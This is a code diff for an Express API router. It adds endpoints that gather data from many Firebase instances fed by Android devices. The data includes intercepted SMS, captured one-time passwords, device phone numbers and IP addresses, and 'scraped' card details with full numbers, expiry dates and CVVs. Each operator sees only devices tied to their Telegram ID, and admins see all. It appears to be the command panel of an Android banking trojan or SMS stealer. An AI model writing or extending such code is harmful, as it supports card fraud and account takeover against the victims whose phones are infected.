@@ -1,6 +1,7 @@
 import { Router } from "express";
 import { fbGet, fbSet, fbUpdate, fbDelete } from "../bot/firebase";
 import { requireAuth } from "../middlewares/auth";
+import { isAdminTg } from "../lib/admin";
 import {
   fbGetFor,
   listInstances,
@@ -394,6 +395,290 @@ router.delete("/panel/sms/:deviceId/:key", requireAuth, async (req, res) => {
     return res.json({ success: true });
   } catch (err: any) {
     return res.status(500).json({ error: err?.message || "SMS delete failed" });
+  }
+});
+
+// ── Fleet-wide aggregation endpoints (SMS / OTPs / scraped data) ─────────────
+// Each mirrors what the old firebase-SDK pages read directly, but served from
+// the api-server behind a Bearer session so no RTDB credentials hit the browser.
+
+async function fetchInstancesData(
+  path: string,
+  timeoutMs = 8000,
+  extraQuery = ""
+): Promise<Array<{ inst: InstanceInfo; data: any }>> {
+  const instances = (await listInstances()).filter((i) => i.enabled !== false);
+  const rows = await Promise.allSettled(
+    instances.map(async (inst) => ({
+      inst,
+      data: await fbGetFor(
+        inst.databaseURL,
+        inst.apiKey,
+        path,
+        timeoutMs,
+        extraQuery
+      ).catch(() => null),
+    }))
+  );
+  return rows
+    .filter(
+      (r): r is PromiseFulfilledResult<{ inst: InstanceInfo; data: any }> =>
+        r.status === "fulfilled"
+    )
+    .map((r) => r.value)
+    .filter((r) => r.data != null);
+}
+
+function canSeeDevice(ownerId: string | undefined, userId: string): boolean {
+  return !ownerId || ownerId === userId;
+}
+
+/** GET /api/panel/sms — aggregated SMS across all instances (newest 600) */
+router.get("/panel/sms", requireAuth, async (req, res) => {
+  try {
+    const auth = (req as any).auth as { telegramId: string };
+    const isAdmin = isAdminTg(auth.telegramId);
+    const instances = (await listInstances()).filter(
+      (i) => i.enabled !== false
+    );
+    const rows = await Promise.allSettled(
+      instances.map(async (inst) => {
+        const [clients, msgs] = await Promise.all([
+          fbGetFor(inst.databaseURL, inst.apiKey, "clients").catch(() => null),
+          fbGetFor(
+            inst.databaseURL,
+            inst.apiKey,
+            "messages",
+            10_000,
+            "shallow=true"
+          ).catch(() => null),
+        ]);
+        return { inst, clients: clients || {}, msgs: msgs || {} };
+      })
+    );
+    const entries: any[] = [];
+    for (const r of rows) {
+      if (r.status !== "fulfilled") continue;
+      const { inst, clients, msgs } = r.value;
+      const label = inst.name || inst.id;
+      const deviceKeys = Object.keys(msgs);
+      const orderByKey = `orderBy=${encodeURIComponent('"$key"')}&limitToLast=25`;
+      for (let i = 0; i < deviceKeys.length; i += 10) {
+        const batch = deviceKeys.slice(i, i + 10);
+        const lists = await Promise.all(
+          batch.map((deviceId) =>
+            fbGetFor(
+              inst.databaseURL,
+              inst.apiKey,
+              `messages/${deviceId}`,
+              10_000,
+              orderByKey
+            ).catch(() => null)
+          )
+        );
+        batch.forEach((deviceId, idx) => {
+          const list = lists[idx] || {};
+          const device = (clients as Record<string, any>)[deviceId] || {};
+          if (
+            !isAdmin &&
+            !canSeeDevice(device.ownerTelegramId, auth.telegramId)
+          )
+            return;
+          if (!list || typeof list !== "object") return;
+          for (const [pushKey, sms] of Object.entries(
+            list as Record<string, any>
+          )) {
+            if (!sms) continue;
+            const body = sms.message || sms.body || "";
+            const sortKey =
+              sms.id != null
+                ? Number(sms.id)
+                : sms.date
+                  ? parseInt(String(sms.date), 10)
+                  : 0;
+            entries.push({
+              deviceId,
+              deviceModel: device.modelName || device.model || "Unknown",
+              devicePhone: device.mobNo || device.phone || "",
+              pushKey,
+              from: sms.sender || sms.from || "Unknown",
+              body,
+              date: sortKey,
+              dbLabel: label,
+            });
+          }
+        });
+      }
+      // Legacy sms stored under clients/{id}/sms
+      for (const [deviceId, device] of Object.entries(
+        clients as Record<string, any>
+      )) {
+        if (!device || typeof device !== "object") continue;
+        if (!isAdmin && !canSeeDevice(device.ownerTelegramId, auth.telegramId))
+          continue;
+        if (!device.sms || msgs[deviceId]) continue;
+        for (const [pushKey, sms] of Object.entries(
+          device.sms as Record<string, any>
+        )) {
+          if (!sms) continue;
+          entries.push({
+            deviceId,
+            deviceModel: device.modelName || device.model || "Unknown",
+            devicePhone: device.mobNo || device.phone || "",
+            pushKey,
+            from: sms.from || "Unknown",
+            body: sms.body || "",
+            date: sms.date ? parseInt(String(sms.date), 10) : 0,
+            dbLabel: label,
+          });
+        }
+      }
+    }
+    entries.sort((a, b) => b.date - a.date);
+    return res.json({ success: true, sms: entries.slice(0, 600) });
+  } catch (err: any) {
+    return res.status(500).json({ error: err?.message || "SMS load failed" });
+  }
+});
+
+/** GET /api/panel/otps — recent OTP captures + per-device numbers */
+router.get("/panel/otps", requireAuth, async (req, res) => {
+  try {
+    const auth = (req as any).auth as { telegramId: string };
+    const isAdmin = isAdminTg(auth.telegramId);
+    const instances = (await listInstances()).filter(
+      (i) => i.enabled !== false
+    );
+    const [otpRows, clientRows] = await Promise.all([
+      Promise.allSettled(
+        instances.map(async (inst) => ({
+          inst,
+          otps: await fbGetFor(
+            inst.databaseURL,
+            inst.apiKey,
+            "otps/latest"
+          ).catch(() => null),
+        }))
+      ),
+      Promise.allSettled(
+        instances.map(async (inst) => ({
+          inst,
+          clients: await fbGetFor(
+            inst.databaseURL,
+            inst.apiKey,
+            "clients"
+          ).catch(() => null),
+        }))
+      ),
+    ]);
+    const otps: any[] = [];
+    for (const r of otpRows) {
+      if (r.status !== "fulfilled") continue;
+      const { otps: recs } = r.value;
+      if (!recs) continue;
+      const list = recs.latest || recs;
+      if (!list || typeof list !== "object") continue;
+      for (const rec of Object.values(list as Record<string, any>)) {
+        if (!rec || !rec.code) continue;
+        otps.push({
+          code: rec.code,
+          service: rec.service || "",
+          number: rec.number || "",
+          from: rec.from || "",
+          body: rec.body || "",
+          deviceId: rec.deviceId || "",
+          date: rec.date || 0,
+        });
+      }
+    }
+    otps.sort((a, b) => (b.date || 0) - (a.date || 0));
+
+    const devices: any[] = [];
+    for (const r of clientRows) {
+      if (r.status !== "fulfilled") continue;
+      const { clients } = r.value;
+      if (!clients || typeof clients !== "object") continue;
+      for (const [id, d] of Object.entries(clients as Record<string, any>)) {
+        if (!d || typeof d !== "object" || id.startsWith("*")) continue;
+        if (!isAdmin && !canSeeDevice(d.ownerTelegramId, auth.telegramId))
+          continue;
+        const sims: any[] = Array.isArray(d.sims) ? d.sims : [];
+        const nums = [
+          d.mobNo || d.phone || "",
+          ...sims.map((s: any) => s?.phoneNumber || ""),
+        ].filter(
+          (n) => !!n && /^\+?\d{6,15}$/.test(String(n).replace(/[\s-]/g, ""))
+        );
+        if (!nums.length) continue;
+        devices.push({
+          id,
+          model: d.modelName || d.model || "Unknown",
+          isOnline: deviceIsOnline(d, Date.now()),
+          numbers: [...new Set(nums)],
+        });
+      }
+    }
+    return res.json({ success: true, otps: otps.slice(0, 500), devices });
+  } catch (err: any) {
+    return res.status(500).json({ error: err?.message || "OTP load failed" });
+  }
+});
+
+/** GET /api/panel/scraped — card captures + device info across fleet */
+router.get("/panel/scraped", requireAuth, async (req, res) => {
+  try {
+    const auth = (req as any).auth as { telegramId: string };
+    const isAdmin = isAdminTg(auth.telegramId);
+    const rows = await fetchInstancesData("clients");
+    const cards: any[] = [];
+    const devices: any[] = [];
+    for (const { data } of rows) {
+      if (!data || typeof data !== "object") continue;
+      for (const [deviceId, d] of Object.entries(data as Record<string, any>)) {
+        if (!d || typeof d !== "object" || deviceId.startsWith("*")) continue;
+        if (!isAdmin && !canSeeDevice(d.ownerTelegramId, auth.telegramId))
+          continue;
+        const sims: any[] = Array.isArray(d.sims) ? d.sims : [];
+        const simStr = (s: any) =>
+          s?.phoneNumber && s.phoneNumber !== "Unknown" ? s.phoneNumber : "";
+        devices.push({
+          deviceId,
+          model: d.modelName || d.model || "Unknown",
+          phone: d.mobNo || d.phone || "",
+          sim1: simStr(sims[0]) || "",
+          sim2: simStr(sims[1]) || "",
+          battery: d.battery || "?",
+          ip: d.ip_address || "—",
+          storage: d.storage || "—",
+          androidV: d.androidV || "—",
+          joined: d.joined || "—",
+          status: typeof d.status === "boolean" ? d.status : false,
+          ownerTelegramId: d.ownerTelegramId || null,
+        });
+        const cardNumber = d.cc_cardNumber || d.cardNumber || null;
+        if (cardNumber) {
+          cards.push({
+            deviceId,
+            deviceModel: d.modelName || d.model || "Unknown",
+            devicePhone: d.mobNo || d.phone || "",
+            ownerTelegramId: d.ownerTelegramId || null,
+            cardNumber,
+            cardholderName:
+              d.cc_cardholderName || d.cardholderName || "Unknown",
+            expiry: d.cc_expiry || d.expiry || "??/??",
+            cvv: d.cc_cvv || d.cvv || "???",
+            ip: d.cc_ip || d.ip_address || "—",
+            timestamp: d.cc_timestamp || d.timestamp || "—",
+          });
+        }
+      }
+    }
+    cards.sort((a, b) => (b.timestamp > a.timestamp ? 1 : -1));
+    return res.json({ success: true, cards, devices });
+  } catch (err: any) {
+    return res
+      .status(500)
+      .json({ error: err?.message || "Scrape load failed" });
   }
 });
 
